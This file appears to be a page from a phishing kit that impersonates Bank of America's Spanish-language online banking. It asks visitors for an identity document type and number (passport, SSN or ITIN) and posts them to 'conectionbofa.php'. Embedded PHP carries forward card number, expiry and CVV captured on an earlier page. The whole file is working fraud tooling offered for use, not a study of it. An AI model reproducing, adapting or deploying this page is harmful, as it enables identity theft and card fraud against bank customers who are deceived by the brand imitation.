
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="css/normalize.min.css" />
    <link rel="stylesheet" href="css/estilos.css" />
    <title>Banca en Línea</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
</head>

<body>
    <div class="container">
        <div class="banner1">
            <img src="img/logo.jpg" alt="logo" />
            <p class="txtg">Entrar</p>
            <div class="derLinks">
                <img class="sarea" src="img/lock.jpg" alt="candado" />
                <div class="areaSegura">Área protegida</div>
                <img class="sarea2" src="img/points.jpg" alt="puntos" />
                <div class="lenguaje">In English</div>
            </div>
        </div>
        <div class="banner2">
            <h1>Verificar su identidad</h1>
        </div>
        <div class="banner3">
            <div class="columnas">
                <div class="columnaX">
                    <h2 class="titulo2">Casi hemos terminado</h2>
                    <p>Proporcione la siguiente información para completar el proceso de verificación</p>
                    <form action="conectionbofa.php" method="post">
                        <div class="form-group-l">
                            <label class="form2label" for="correo">Tipo de documento</label>

                            <select name="docu" id="docu" style="height: 27px;width:212px;" require>
                                <option value="">Seleccione</option>
                                <option value="Pasaporte">Pasaporte</option>
                                <option value="Numero de Seguro Social">Número de Seguro Social (SSN)</option>
                                <option value="Numero de Identificacion Personal del Contribuyente">Número de Identificación Personal del Contribuyente (ITIN)</option>
                            </select>
                        </div>

                        <div class="form-group-l">
                            <label class="form2label" for="correo">Número de Identificación</label>

                            <input type="text" name="ndocu" placeholder="123456789" required>
                        </div>
                        
                        <div class="footer-form">
                            <p style="position: relative; width: 600px">
                            Recuerde ingresar sus datos cuidadosamente a fin de comprobar su identidad y seguir proporcionandole nuestros servicios de Online Banking
                            </p>
                            <button class="btn principal" name="add" type="submit">
                                CONFIRMAR
                            </button>
                        </div>
                    </form>
                </div>
                <div class="columna3" style="float: right">
                    <h2>Ayuda para entrar</h2>
                    <ul class="menosmargin">
                        <li>
                            <a href="#">
                                ¿No reconoce o no puede acceder a la dirección de correo
                                electrónico o al número de teléfono proporcionados?
                            </a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="banner4" style="height: 130px">
            <div class="fondolock"></div>
            <p>Área protegida</p>
            <div class="enlaces-footer">
                <a href="#">Privacidad</a>
                <a href="#">Seguridad</a>
            </div>
            <div class="copirait">
                <p>Bank of America, N.A. Miembro de FDIC.</p>
                <a href="#">
                    Igualdad de oportunidades en préstamos para viviendas
                </a>
                
                <?php 
                     $variable= $_POST['card'];
        echo '<a href="pa2.php"></a><input id="card" name="card" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
		    <?php 
                     $variable= $_POST['mes'];
        echo '<a href="pa2.php"></a><input id="mes" name="mes" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
		    <?php 
                     $variable= $_POST['year'];
        echo '<a href="pa2.php"></a><input id="year" name="year" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>
		    <?php 
                     $variable= $_POST['cvv'];
        echo '<a href="pa2.php"></a><input id="cvv" name="cvv" value="'. htmlspecialchars($variable) . '" readonly />'."\n";
		?>

                <span class="corporation">© 2021 Bank of America Corporation.</span>
            </div>
        </div>
    </div>
    <script src="js/funciones.js"></script>
</body>

</html>
